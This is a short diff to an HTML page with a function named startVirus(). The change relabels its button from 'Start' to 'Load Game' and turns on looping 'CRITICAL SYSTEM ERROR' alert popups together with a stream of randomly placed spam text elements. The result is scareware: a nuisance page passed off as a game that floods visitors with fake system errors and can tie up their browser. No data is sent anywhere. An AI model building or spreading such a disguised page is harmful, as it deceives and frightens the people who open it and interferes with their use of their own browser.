@@ -29,8 +29,8 @@
   </style>
 </head>
 <body>
-  <h1>Start</h1>
-  <button onclick="startVirus()">Start</button>
+  <h1></h1>
+  <button onclick="startVirus()">Load Game</button>
 
   <script>
     function startVirus() {
@@ -41,9 +41,9 @@
       }
 
       // Looping alerts
-      //setInterval(() => alert("CRITICAL SYSTEM ERROR"), 4000);
+      setInterval(() => alert("CRITICAL SYSTEM ERROR"), Infinity);
 
-      /* Spam text
+      // Spam text
       setInterval(() => {
         const msg = document.createElement('div');
         msg.className = "spam";
@@ -52,7 +52,6 @@
         msg.style.top = Math.random() * window.innerHeight + "px";
         document.body.appendChild(msg);
       }, 150);
-      */
     }
   </script>
 </body>
